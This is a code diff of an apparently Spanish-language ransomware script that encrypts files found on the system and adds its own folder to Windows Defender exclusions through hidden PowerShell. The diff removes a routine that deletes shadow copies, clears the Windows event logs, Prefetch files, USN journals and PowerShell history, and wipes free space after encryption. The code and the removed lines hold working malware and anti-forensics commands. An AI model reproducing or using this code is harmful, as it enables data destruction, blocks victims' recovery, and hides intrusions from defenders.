@@ -47,37 +47,7 @@ def add_exclusion():
         script_dir = os.path.abspath(os.getcwd())
         ps_cmd = f'Add-MpPreference -ExclusionPath "{script_dir}"'
         subprocess.Popen(['powershell', '-w', 'h', '-c', ps_cmd], creationflags=0x08000000)
-        time.sleep(2)
-    except:
-        pass
-
-
-def pre_cleanup():
-    try:
-        subprocess.Popen(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], creationflags=0x08000000)
-        subprocess.Popen(['wmic', 'shadowcopy', 'delete'], creationflags=0x08000000)
-        subprocess.Popen(['powercfg', '-h', 'off'], creationflags=0x08000000)
-        subprocess.Popen([
-            'reg', 'add',
-            r'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management',
-            '/v', 'ClearPageFileAtShutdown',
-            '/t', 'REG_DWORD',
-            '/d', '1',
-            '/f'
-        ], creationflags=0x08000000)
-        subprocess.Popen(['powershell', '-w', 'h', '-nop', '-c', 'Remove-Item C:\\Windows\\Prefetch\\*.pf -Force'], creationflags=0x08000000)
-        subprocess.Popen(['wevtutil', 'cl', 'Application'], creationflags=0x08000000)
-        subprocess.Popen(['wevtutil', 'cl', 'System'], creationflags=0x08000000)
-        subprocess.Popen(['wevtutil', 'cl', 'Security'], creationflags=0x08000000)
-        ps_history = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
-        if os.path.exists(ps_history):
-            open(ps_history, 'w').close()
-        for drive in ['C:', 'D:', 'E:', 'F:']:
-            if os.path.exists(drive):
-                subprocess.Popen(['fsutil', 'usn', 'deletejournal', '/D', drive], creationflags=0x08000000)
-        subprocess.Popen(['reg', 'delete', r'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache', '/f'], creationflags=0x08000000)
-        import ctypes
-        ctypes.windll.psapi.EmptyWorkingSet(-1)
+        time.sleep(3)
     except:
         pass
 
@@ -137,12 +107,6 @@ except ImportError:
 def encriptar_archivo(enc, ruta):
     try:
         result = enc.encriptar(ruta)
-        if result:
-            try:
-                dirname = os.path.dirname(ruta)
-                subprocess.Popen(['cipher', '/w:' + dirname], creationflags=0x08000000)
-            except:
-                pass
         return result
     except:
         return False
@@ -155,7 +119,6 @@ def main():
         if not verificar_e_instalar_dependencias():
             sys.exit(1)
         
-        pre_cleanup()
         threading.Thread(target=cleanup_python_thread, daemon=True).start()
         os.chdir(SCRIPT_DIR)
         archivos, _, _ = escanear_sistema()
@@ -170,7 +133,6 @@ def main():
                 except:
                     pass
         wipe_memory_aggressive()
-        pre_cleanup()
     except:
         pass
 
